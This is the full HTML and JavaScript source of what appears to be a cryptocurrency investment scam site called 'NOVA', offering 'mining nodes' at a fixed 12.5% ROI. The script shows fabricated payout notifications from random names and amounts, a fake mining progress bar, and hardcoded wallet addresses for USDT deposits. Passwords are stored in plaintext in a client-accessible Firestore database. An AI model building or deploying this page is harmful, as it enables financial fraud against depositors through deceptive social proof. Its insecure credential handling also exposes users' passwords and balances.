<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Worldwide Institutional Asset Management</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        :root { --bg: #020617; --card: #0f172a; --accent: #10B981; --text: #f8fafc; --dim: #94a3b8; --gold: #fbbf24; --danger: #ef4444; }
        body { margin: 0; font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; padding-bottom: 100px; }
        
        /* 1. Global Market Ticker */
        #ticker { background: #1e293b; padding: 12px; font-size: 11px; font-weight: 800; white-space: nowrap; overflow: hidden; border-bottom: 1px solid rgba(16, 185, 129, 0.2); color: var(--accent); }
        .ticker-move { display: inline-block; animation: move 25s linear infinite; }
        @keyframes move { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }

        /* 2. Professional UI Layout */
        .glass { background: var(--card); border: 1px solid rgba(255,255,255,0.05); border-radius: 32px; padding: 22px; margin: 15px; box-shadow: 0 15px 35px rgba(0,0,0,0.4); }
        .btn-prime { width: 100%; padding: 18px; background: var(--accent); color: white; border: none; border-radius: 22px; font-weight: 800; cursor: pointer; transition: 0.3s; text-transform: uppercase; letter-spacing: 1px; }
        .btn-prime:active { transform: scale(0.95); }
        input, select { width: 100%; padding: 16px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 20px; margin-bottom: 15px; outline: none; font-family: inherit; }

        .app-header { padding: 20px; background: rgba(15, 23, 42, 0.9); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
        .vip-tag { font-size: 10px; background: var(--gold); color: #000; padding: 4px 12px; border-radius: 50px; font-weight: 900; }

        /* 3. Global Mining Progress */
        .progress-container { width: 100%; background: #1e293b; border-radius: 10px; height: 10px; margin: 15px 0; overflow: hidden; position: relative; border: 1px solid rgba(16, 185, 129, 0.3); }
        .progress-bar { height: 100%; background: linear-gradient(90deg, #10B981, #34d399, #10B981); width: 0%; transition: width 0.1s linear; box-shadow: 0 0 15px var(--accent); }

        /* 4. Real-time Worldwide Payout Toasts */
        #toast { position: fixed; bottom: 110px; left: 50%; transform: translateX(-50%); background: rgba(15, 23, 42, 0.95); border: 1px solid var(--accent); padding: 15px; border-radius: 25px; font-size: 11px; z-index: 9999; display: none; width: 85%; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.8); backdrop-filter: blur(10px); }

        /* 5. Modern Nodes Grid */
        .node-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 18px; padding: 15px; }
        .node-card { background: var(--card); border-radius: 28px; padding: 18px; border: 1px solid rgba(255,255,255,0.03); text-align: center; position: relative; overflow: hidden; transition: 0.3s; }
        .node-card:hover { border-color: var(--accent); transform: translateY(-5px); }
        .node-img { width: 100%; height: 110px; border-radius: 20px; object-fit: cover; margin-bottom: 12px; filter: brightness(0.9); }
        .yield-badge { position: absolute; top: 12px; right: 12px; background: var(--accent); color: white; font-size: 9px; padding: 3px 8px; border-radius: 8px; font-weight: 900; }

        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.98); display: flex; justify-content: space-around; padding: 18px 0; border-top: 1px solid #1e293b; z-index: 1000; }
        .nav-item { text-align: center; color: var(--dim); font-size: 10px; font-weight: 800; cursor: pointer; }
        .nav-item.active { color: var(--accent); }
        
        .screen { display: none; animation: slideIn 0.4s ease-out; }
        .screen.active { display: block; }
        @keyframes slideIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div id="ticker"><div class="ticker-move">🌐 NOVA WORLDWIDE: PLATFORM STATUS: OPERATIONAL • BTC: $64,231 • ETH: $3,452 • TOTAL NODES ACTIVE: 14,802 • SECURE SSL ENCRYPTION ENABLED • 🌐</div></div>

    <div id="toast"></div>

    <div id="auth-screen" style="min-height:100vh; display:flex; flex-direction:column; align-items:center; justify-content:center; padding:25px; background: radial-gradient(circle at top, #1e293b, #020617);">
        <h1 style="font-size:4.5rem; font-weight:900; letter-spacing:-5px; margin-bottom:5px;">NOVA<span style="color:var(--accent);">.</span></h1>
        <p style="color:var(--dim); font-size:10px; letter-spacing:3px; font-weight:800; margin-bottom:30px;">GLOBAL ASSET TERMINAL</p>
        <div class="glass" style="width:100%; max-width:400px;">
            <input type="text" id="username" placeholder="Enter Global ID">
            <input type="password" id="password" placeholder="Passkey">
            <button class="btn-prime" onclick="handleAuth()">Access Protocol</button>
            <p onclick="toggleAuth()" id="toggleTxt" style="text-align:center; font-size:11px; color:var(--dim); margin-top:25px; cursor:pointer;">No Identity? <span style="color:var(--accent)">Register Globally</span></p>
        </div>
    </div>

    <div id="app-main" style="display:none;">
        <header class="app-header">
            <div style="display:flex; align-items:center; gap:12px;">
                <div style="width:42px; height:42px; background:var(--accent); border-radius:14px; display:flex; align-items:center; justify-content:center; font-weight:900; color:white;">N</div>
                <div><small id="userDisp" style="font-weight:900; display:block;">USER</small><span id="vipStatus" class="vip-tag">BASIC</span></div>
            </div>
            <div style="display:flex; gap:15px; align-items:center;">
                <div style="width:10px; height:10px; background:#10B981; border-radius:50%; box-shadow: 0 0 10px #10B981;"></div>
                <i class="fa-solid fa-power-off" onclick="logout()" style="color:var(--danger); font-size:1.4rem; cursor:pointer;"></i>
            </div>
        </header>

        <div id="home" class="screen active">
            <div class="glass" style="background: linear-gradient(135deg, #10B981, #064e3b); border:none; position:relative; overflow:hidden;">
                <div style="position:absolute; top:-20px; right:-20px; width:120px; height:120px; background:rgba(255,255,255,0.1); border-radius:50%;"></div>
                <small style="opacity:0.8; font-weight:900; letter-spacing:1px; color:white;">TOTAL GLOBAL ASSETS</small>
                <h1 style="font-size:3.8rem; margin:12px 0; letter-spacing:-3px; color:white;" id="mainBal">$0.00</h1>
                
                <p style="font-size:9px; font-weight:900; color:rgba(255,255,255,0.8); margin-bottom:5px;">LIVE MINING PROTOCOL</p>
                <div class="progress-container"><div id="miningBar" class="progress-bar"></div></div>
                
                <div style="display:flex; justify-content:space-between; margin-top:20px; font-size:12px; font-weight:900; border-top:1px solid rgba(255,255,255,0.1); padding-top:15px;">
                    <span style="color:white;">DAILY: <b id="dayYield">+$0.00</b></span>
                    <span style="color:white;">TOTAL: <b id="totProfit">$0.00</b></span>
                </div>
            </div>

            <h4 style="margin:25px 22px 12px; color:var(--dim); font-size:12px; letter-spacing:2px; font-weight:800;">WORLDWIDE CLUSTERS</h4>
            <div id="nodeGrid" class="node-grid"></div>
        </div>

        <div id="vault" class="screen">
            <div class="glass">
                <h3 style="margin:0 0 20px 0;"><i class="fa-solid fa-download" style="color:var(--accent)"></i> Global Deposit</h3>
                <select id="depMethod" onchange="updateAddr()">
                    <option value="MetaMask">MetaMask (USDT-ERC20)</option>
                    <option value="Trust">Trust Wallet (USDT-TRC20)</option>
                </select>
                <div style="background:#020617; padding:20px; border-radius:20px; border:2px dashed #1e293b; margin-bottom:20px;">
                    <small style="color:var(--dim); font-weight:900; font-size:10px;">SECURE DEPOSIT ADDRESS:</small>
                    <p id="walletAddr" style="font-size:11px; word-break:break-all; font-weight:900; color:var(--accent); margin:10px 0;">0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2</p>
                </div>
                <input type="number" id="depAmt" placeholder="Amount ($)">
                <input type="text" id="tid" placeholder="Transaction Hash / ID">
                <button class="btn-prime" onclick="submitDep()">Verify Transfer</button>
            </div>

            <div class="glass" style="border-top:5px solid var(--danger);">
                <h3 style="margin:0 0 20px 0;"><i class="fa-solid fa-paper-plane" style="color:var(--danger)"></i> Global Extraction</h3>
                <input type="number" id="witAmt" placeholder="Min Withdrawal $50">
                <input type="text" id="witAddr" placeholder="Receiver Wallet Address">
                <button class="btn-prime" onclick="submitWit()" style="background:var(--danger);">Request Payout</button>
            </div>
        </div>
    </div>

    <nav class="bottom-nav" id="nav-bar" style="display:none;">
        <div class="nav-item active" onclick="nav('home', this)"><i class="fa-solid fa-house-crack"></i><br>HOME</div>
        <div class="nav-item" onclick="nav('vault', this)"><i class="fa-solid fa-vault"></i><br>VAULT</div>
        <div class="nav-item"><i class="fa-solid fa-users-rays"></i><br>AFFILIATE</div>
    </nav>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, updateDoc, addDoc, collection, onSnapshot } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let user = null; let bal = 0; let isLogin = true;

        window.toggleAuth = () => {
            isLogin = !isLogin;
            document.querySelector('#auth-screen button').innerText = isLogin ? "Access Protocol" : "Initialize Identity";
        };

        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("Required fields missing!");
            const ref = doc(db, "users", u);
            const snap = await getDoc(ref);
            if(isLogin) {
                if(snap.exists() && snap.data().password === p) { sessionStorage.setItem("nova_user", u); start(); }
                else alert("Authentication Failed!");
            } else {
                if(snap.exists()) return alert("Identity already exists!");
                await setDoc(ref, { password: p, balance: 0, daily: 0, total: 0 });
                alert("Identity Registered Globally!"); isLogin = true; toggleAuth();
            }
        };

        function start() {
            user = sessionStorage.getItem("nova_user");
            document.getElementById('auth-screen').style.display = 'none';
            document.getElementById('app-main').style.display = 'block';
            document.getElementById('nav-bar').style.display = 'flex';
            document.getElementById('userDisp').innerText = user.toUpperCase();

            onSnapshot(doc(db, "users", user), (d) => {
                const data = d.data(); bal = data.balance;
                document.getElementById('mainBal').innerText = "$" + bal.toLocaleString();
                document.getElementById('dayYield').innerText = "+$" + (data.daily || 0).toLocaleString();
                document.getElementById('totProfit').innerText = "$" + (data.total || 0).toLocaleString();
                document.getElementById('vipStatus').innerText = bal > 10000 ? "WHALE" : (bal > 1000 ? "ELITE" : "BASIC");
            });
            renderNodes(); startMiningAnim(); startToasts();
        }

        function startMiningAnim() {
            let p = 0;
            setInterval(() => {
                p = (p + 0.5) % 100;
                document.getElementById('miningBar').style.width = p + "%";
            }, 100);
        }

        function startToasts() {
            const names = ["James (USA)", "Emma (UK)", "Arjun (IND)", "Sarah (CAN)", "Li (CHN)", "Omar (UAE)", "Elena (RUS)", "Mateo (BRA)"];
            setInterval(() => {
                const toast = document.getElementById('toast');
                const n = names[Math.floor(Math.random()*names.length)];
                const a = Math.floor(Math.random()*2500) + 100;
                toast.innerHTML = `<i class="fa-solid fa-circle-check" style="color:var(--accent)"></i> Worldwide Payout: <b>${n}</b> withdrew <b>$${a}</b>`;
                toast.style.display = "block";
                setTimeout(() => toast.style.display = "none", 4000);
            }, 12000);
        }

        function renderNodes() {
            const grid = document.getElementById('nodeGrid'); grid.innerHTML = "";
            const prices = [30, 100, 250, 500, 1000, 2500, 5000, 10000, 20000, 30000];
            prices.forEach((p, i) => {
                grid.innerHTML += `<div class="node-card">
                    <span class="yield-badge">12.5% ROI</span>
                    <img src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?w=300" class="node-img">
                    <h2 style="margin:8px 0; font-size:1.5rem; font-weight:900;">$${p.toLocaleString()}</h2>
                    <p style="font-size:10px; color:var(--accent); font-weight:800; text-transform:uppercase;">Global Cluster V.${i+1}</p>
                    <button onclick="buy(${p})" style="width:100%; border:none; background:rgba(16,185,129,0.1); color:var(--accent); padding:12px; border-radius:15px; font-weight:900; font-size:10px; margin-top:12px; cursor:pointer;">ACTIVATE</button>
                </div>`;
            });
        }

        window.updateAddr = () => {
            const m = document.getElementById('depMethod').value;
            document.getElementById('walletAddr').innerText = m === "MetaMask" ? "0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2" : "0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37";
        };

        window.buy = async (p) => {
            if(bal < p) return alert("Insufficient Balance in Protocol!");
            if(confirm(`Confirm Activation of Global Node for $${p}?`)) {
                await updateDoc(doc(db, "users", user), { balance: bal - p });
                alert("Cluster Operational! Harvesting starting soon.");
            }
        };

        window.submitDep = async () => {
            const amt = document.getElementById('depAmt').value;
            const t = document.getElementById('tid').value;
            if(!amt || !t) return alert("Verify all transaction details!");
            await addDoc(collection(db, "pending_tx"), { user, amount: parseFloat(amt), tid: t, status: "Pending", type: "Deposit", time: Date.now() });
            alert("Verification Request Submitted to Global Admin!");
        };

        window.submitWit = async () => {
            const amt = parseFloat(document.getElementById('witAmt').value);
            if(amt < 50 || bal < amt) return alert("Invalid Extraction Amount!");
            await updateDoc(doc(db, "users", user), { balance: bal - amt });
            await addDoc(collection(db, "pending_tx"), { user, amount: amt, status: "Pending", type: "Withdraw", time: Date.now() });
            alert("Withdrawal Process Initialized!");
        };

        window.nav = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            el.classList.add('active');
        };

        window.logout = () => { sessionStorage.clear(); location.reload(); };
        if(sessionStorage.getItem("nova_user")) start();
    </script>
</body>
</html>
